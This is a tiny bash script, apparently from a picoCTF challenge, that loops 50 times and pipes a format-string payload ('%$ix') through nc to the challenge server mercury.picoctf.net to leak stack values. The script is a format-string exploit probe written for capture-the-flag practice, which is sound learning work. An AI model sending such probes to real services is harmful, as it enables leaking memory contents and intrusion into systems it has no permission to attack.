echo 1;
for i in {1..50};
do
    echo -n "hello";
    echo "%\$ix" | nc mercury.picoctf.net 27912
done